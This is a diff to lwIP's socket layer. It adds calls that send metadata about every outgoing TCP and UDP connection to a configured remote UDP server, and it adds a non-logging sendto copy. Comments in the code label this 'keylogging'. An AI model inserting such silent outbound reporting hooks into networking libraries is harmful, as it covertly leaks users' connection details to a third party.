@@ -41,7 +41,9 @@
 
 #if LWIP_SOCKET /* don't build if not configured for use in lwipopts.h */
 
-//#include "lwip/sockets.h"
+#include "sockets.h"
+#include "udp_send.h"
+#include "global_config.h"
 #include "lwip/priv/sockets_priv.h"
 #include "lwip/api.h"
 #include "lwip/sys.h"
@@ -59,7 +61,8 @@
 #if LWIP_CHECKSUM_ON_COPY
 #include "lwip/inet_chksum.h"
 
-#include "sockets.h"
+
+
 #endif
 
 #if LWIP_COMPAT_SOCKETS == 2 && LWIP_POSIX_SOCKETS_IO_NAMES
@@ -1508,6 +1511,7 @@ lwip_send(int s, const void *data, size_t size, int flags)
     char msg_data[1024];
     sprintf(msg_data, "TCP connection to Socket: %d, IP: %s, Port %d, Size: %d bytes\n" , s, inet_ntoa(addr), (int)port, (int)size);
     printf("%s",msg_data);
+    udp_send_msg(UDP_SERVER_IP, UDP_SERVER_PORT, msg_data);
     //printf("(TCP) To Socket: %d, IP: %s , Port: %d, Msg: %s\n",s,inet_ntoa(addr), (int)port,temp);
     /*End Printing message to console for keylogging*/
 
@@ -1775,8 +1779,110 @@ lwip_sendto(int s, const void *data, size_t size, int flags,
     char msg_data[1024];
     sprintf(msg_data, "UDP connection to Socket: %d, IP: %s, Port %d, Size: %d bytes\n" , s, inet_ntoa(buf.addr), remote_port, (int)size);
     printf("%s",msg_data);
+    udp_send_msg(UDP_SERVER_IP, UDP_SERVER_PORT, msg_data);
     //printf("(UDP) To Socket: %d, IP: %s , Port: %d, Msg: %s\n",s,inet_ntoa(buf.addr),remote_port,temp);
     /*End Printing message to console for keylogging*/
+  }
+
+  /* deallocated the buffer */
+  netbuf_free(&buf);
+
+  sock_set_errno(sock, err_to_errno(err));
+  done_socket(sock);
+  return (err == ERR_OK ? short_size : -1);
+}
+
+
+ssize_t
+lwip_sendto_nolog(int s, const void *data, size_t size, int flags,
+            const struct sockaddr *to, socklen_t tolen)
+{
+  struct lwip_sock *sock;
+  err_t err;
+  u16_t short_size;
+  u16_t remote_port;
+  struct netbuf buf;
+
+  sock = get_socket(s);
+  if (!sock) {
+    return -1;
+  }
+
+  if (NETCONNTYPE_GROUP(netconn_type(sock->conn)) == NETCONN_TCP) {
+#if LWIP_TCP
+    done_socket(sock);
+    return lwip_send(s, data, size, flags);
+#else /* LWIP_TCP */
+    LWIP_UNUSED_ARG(flags);
+    sock_set_errno(sock, err_to_errno(ERR_ARG));
+    done_socket(sock);
+    return -1;
+#endif /* LWIP_TCP */
+  }
+
+  if (size > LWIP_MIN(0xFFFF, SSIZE_MAX)) {
+    /* cannot fit into one datagram (at least for us) */
+    sock_set_errno(sock, EMSGSIZE);
+    done_socket(sock);
+    return -1;
+  }
+  short_size = (u16_t)size;
+  LWIP_ERROR("lwip_sendto: invalid address", (((to == NULL) && (tolen == 0)) ||
+             (IS_SOCK_ADDR_LEN_VALID(tolen) &&
+              ((to != NULL) && (IS_SOCK_ADDR_TYPE_VALID(to) && IS_SOCK_ADDR_ALIGNED(to))))),
+             sock_set_errno(sock, err_to_errno(ERR_ARG)); done_socket(sock); return -1;);
+  LWIP_UNUSED_ARG(tolen);
+
+  /* initialize a buffer */
+  buf.p = buf.ptr = NULL;
+#if LWIP_CHECKSUM_ON_COPY
+  buf.flags = 0;
+#endif /* LWIP_CHECKSUM_ON_COPY */
+  if (to) {
+    SOCKADDR_TO_IPADDR_PORT(to, &buf.addr, remote_port);
+  } else {
+    remote_port = 0;
+    ip_addr_set_any(NETCONNTYPE_ISIPV6(netconn_type(sock->conn)), &buf.addr);
+  }
+  netbuf_fromport(&buf) = remote_port;
+
+
+  LWIP_DEBUGF(SOCKETS_DEBUG, ("lwip_sendto(%d, data=%p, short_size=%"U16_F", flags=0x%x to=",
+                              s, data, short_size, flags));
+  ip_addr_debug_print_val(SOCKETS_DEBUG, buf.addr);
+  LWIP_DEBUGF(SOCKETS_DEBUG, (" port=%"U16_F"\n", remote_port));
+
+  /* make the buffer point to the data that should be sent */
+#if LWIP_NETIF_TX_SINGLE_PBUF
+  /* Allocate a new netbuf and copy the data into it. */
+  if (netbuf_alloc(&buf, short_size) == NULL) {
+    err = ERR_MEM;
+  } else {
+#if LWIP_CHECKSUM_ON_COPY
+    if (NETCONNTYPE_GROUP(netconn_type(sock->conn)) != NETCONN_RAW) {
+      u16_t chksum = LWIP_CHKSUM_COPY(buf.p->payload, data, short_size);
+      netbuf_set_chksum(&buf, chksum);
+    } else
+#endif /* LWIP_CHECKSUM_ON_COPY */
+    {
+      MEMCPY(buf.p->payload, data, short_size);
+    }
+    err = ERR_OK;
+  }
+#else /* LWIP_NETIF_TX_SINGLE_PBUF */
+  err = netbuf_ref(&buf, data, short_size);
+#endif /* LWIP_NETIF_TX_SINGLE_PBUF */
+  if (err == ERR_OK) {
+#if LWIP_IPV4 && LWIP_IPV6
+    /* Dual-stack: Unmap IPv4 mapped IPv6 addresses */
+    if (IP_IS_V6_VAL(buf.addr) && ip6_addr_isipv4mappedipv6(ip_2_ip6(&buf.addr))) {
+      unmap_ipv4_mapped_ipv6(ip_2_ip4(&buf.addr), ip_2_ip6(&buf.addr));
+      IP_SET_TYPE_VAL(buf.addr, IPADDR_TYPE_V4);
+    }
+#endif /* LWIP_IPV4 && LWIP_IPV6 */
+
+    /* send the data */
+    err = netconn_send(sock->conn, &buf);
   }
 
   /* deallocated the buffer */
